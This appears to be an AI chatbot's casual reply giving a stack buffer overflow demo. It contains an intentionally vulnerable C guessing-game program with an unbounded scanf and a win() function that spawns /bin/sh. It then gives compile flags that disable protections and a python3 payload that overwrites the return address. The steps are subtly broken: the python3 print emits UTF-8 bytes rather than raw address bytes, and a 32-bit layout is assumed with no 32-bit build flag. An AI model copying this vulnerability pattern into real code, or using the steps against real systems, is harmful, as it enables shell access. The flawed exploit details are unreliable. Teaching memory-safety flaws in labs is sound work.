
To simulate a real buffer overflow, you need to let the user input a string into a buffer, like so:


---

Modified vulnerable version (intentionally broken)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

void win() {
    printf("YOU HAVE BEEN HACKED! WIN FUNCTION EXECUTED\n");
    system("/bin/sh");
}

int main() {
    int secret;
    int guess;
    char buffer[32];  // small buffer to overflow

    srand(time(NULL));
    secret = rand() % 100 + 1;

    printf("pls guess a number: ");
    fflush(stdout);

    scanf("%s", buffer); // vulnerability here: no bounds check!

    guess = atoi(buffer);

    if (guess < secret) {
        printf("too small\n");
    } else if (guess > secret) {
        printf("too much\n");
    } else {
        printf("congrats\n");
    }

    printf("you guessed : %d\n", guess);
    printf("secret num. : %d\n", secret);

    return 0;
}
```

---

Exploit Simulation Setup

1. What we aim to do:

Overflow buffer[32] with crafted input → overwrite return address → point to win() function → get shell or win message.


---

2. Compile with vulnerable flags:

`gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie`

3. Find win() address with objdump:

`objdump -d ./vuln | grep win`

Example:

`080491e2 <win>:`


---

4. Build payload (simulate manually for now)

Let’s say:

buffer takes 32 bytes

Saved EBP = 4 bytes

Return address is next (total = 36 bytes before overwrite)

win() = 0x080491e2


We construct input like:

`python3 -c 'print("A"*36 + "\xe2\x91\x04\x08")' > input.txt`

Then run:

`./vuln < input.txt`


---

What happens?

Program runs, takes your input into buffer via scanf("%s", buffer) → overflows past buffer → overwrites return address → jumps to win() → shell or print:

`YOU HAVE BEEN HACKED! WIN FUNCTION EXECUTED`


---

Important Note:

This simulation only works with:

No PIE (`-no-pie`)

No stack protector (`-fno-stack-protector`)

Executable stack (`-z execstack`) — for shellcode injection if you go that far



---

Summary:

> You wanted a buffer overflow demo?
There it is: classic C-style ownage, just like the old days, Nii.
One bad scanf("%s", buffer) =
"Game Over" if Blank is playing.

